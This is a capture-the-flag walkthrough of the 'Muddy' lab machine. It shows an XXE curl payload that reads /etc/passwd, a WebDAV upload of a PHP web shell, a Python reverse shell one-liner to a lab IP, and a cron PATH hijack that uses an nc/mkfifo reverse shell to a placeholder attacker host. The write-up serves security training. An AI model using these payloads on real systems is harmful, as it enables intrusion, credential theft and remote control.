# Muddy | PG Practice

***
## We sit in the mud... and reach for the stars.
## Author: whitecr0wz
## Released on: Aug 31, 2021
## Walkthrough: Yes
***


Running our nmap scan we have

```
# Nmap 7.94SVN scan initiated Tue Feb 20 03:49:12 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.178.161
Warning: 192.168.178.161 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.178.161
Host is up (0.14s latency).
Not shown: 65360 closed tcp ports (conn-refused), 168 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
25/tcp   open  smtp       Exim smtpd
| smtp-commands: muddy Hello nmap.scanme.org [192.168.45.204], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to http://muddy.ugc/
111/tcp  open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
808/tcp  open  tcpwrapped
908/tcp  open  tcpwrapped
8888/tcp open  http       WSGIServer 0.1 (Python 2.7.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Ladon Service Catalog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 20 03:51:26 2024 -- 1 IP address (1 host up) scanned in 134.99 seconds

```


Navigating to the IP address we are been referred to `muddy.ug`


![](https://i.imgur.com/xccsjcV.png)



Go ahead and add that to your `/etc/hosts` file, then navigate back to the web page, in which runs on wordpress as we can see below


![](https://i.imgur.com/JmfToMp.png)



We can then use the `wpscan` tool to enumerate further


![](https://i.imgur.com/A4uBlnJ.png)



I tried enumerating plugins and themes but was only seeing stuff like **IDOR** and and **unauthenticated function injection** attacks which were just rabbit holes at the end of the day, Navigating to the other HTTP endpoint on http://muddy.ugc:8888/ which was running a **Ladon Service Catalog**, we have this

![](https://i.imgur.com/3nSmrZm.png)



Making more enumeration i found out that this is vulnerable to a **# XML External Entity Expansion** attack as `CVE-2019-1010268`, Using this [blog](https://vk9-sec.com/xxe-ladon-framework-for-python-xml-external-entity-expansion-cve-2019-1010268/),  we can exploit this by using this curl command to read the `/etc/passwd` file on the system

```bash
curl -s -X $'POST' \
-H $'Content-Type: text/xml;charset=UTF-8' \
-H $'SOAPAction: \"http://muddy.ugc:8888/muddy/soap11/checkout\"' \
--data-binary $'<?xml version="1.0"?>
<!DOCTYPE uid
[<!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
xmlns:urn=\"urn:HelloService\"><soapenv:Header/>
<soapenv:Body>
<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
<uid xsi:type=\"xsd:string\">&passwd;</uid>
</urn:checkout>
</soapenv:Body>
</soapenv:Envelope>' \
'http://muddy.ugc:8888/muddy/soap11/checkout' | xmllint --format -
```


![](https://i.imgur.com/OPB2aey.png)



Now since we have found the XXE vulnerability let try searching for files on the system, first of all i started directory busting on the major page to see what we can identify using `dirsearch`


![](https://i.imgur.com/vZdAthb.png)


We were able to find a `/webdav` directory, After the long run i used the `/var/www/html/webdav/passwd.dav` in the article which just looks like http://muddy.ugc/webdav/ on the web surface 


![](https://i.imgur.com/Kj45a1g.png)



We now have the username called `administrant` and a password hash in MD5, let go ahead and crack the hash for the password

![](https://i.imgur.com/UNdm88r.png)



As we can see we have got the credentials of the `administrant` user called `sleepless`, Navigating to the `/webdav` directory, we are been asked for a password let try it out there and see what we have


![](https://i.imgur.com/zUQ5Sup.png)



As we can see we still have the same `passwd.dav` file, but googling for **webdav exploits**, i found something interesting we can upload a file with the tool `davtest` and then move it to another extension, some kind of file upload bypass


![](https://i.imgur.com/a1ZTWc4.png)


Let go ahead and save our web shell into a `.txt` file and then send it to the target server, then move it to a `.php` Extension


![](https://i.imgur.com/7fCka5W.png)



After several trials saw that i can't specify files locally, so let use `cadaver`


```bash
❯ cadaver http://muddy.ugc/webdav/
Authentication required for Restricted Content on server `muddy.ugc':
Username: **
Password: **

put ./shell.txt
move ./shell.txt ./shell.php
```



![](https://i.imgur.com/xjwyTwi.png)


Now let go ahead and check this out  on the web page, in which we do have it there, your truly :}




![](https://i.imgur.com/cZ8FfXF.png)




Let go ahead and get a reverse shell, Here is the payload i used 


```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.212",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```



![](https://i.imgur.com/ptDMBxk.png)



Checking cron jobs we can see that we have a command running by the root user at every minute


```
cat /etc/crontab
```


![](https://i.imgur.com/yZVwR1e.png)

> As seen above the command runs `netstat -tlpn` and sends the output to the `/root/status` location, does this same thing for `apache2` and `mysql`



First things first, let check if we have write access to any of the PATH location in the `/etc/crontab` file, in which as we can see we have all right as user `www-data`



![](https://i.imgur.com/0iD1unP.png)



We can create a replication of the `netstat` application as a reverse shell and let the cron job running as user `root` execute it for us


```bash
# save this into a file called netstat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER-IP> 4444 >/tmp/f

# grant the file all permissions
chmod 777 netstat
```


![](https://i.imgur.com/KkLHbVj.png)



Now go ahead and start up your listener with netcat and after waiting for a minute you should have your reverse shell as user `root`


```
nc -lvnp 4444
```


![](https://i.imgur.com/t9aFHRI.png)


You can find the `local.txt` flag by using the find command


```bash
find / -type f -name local.txt 2>/dev/null
```



GG


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>

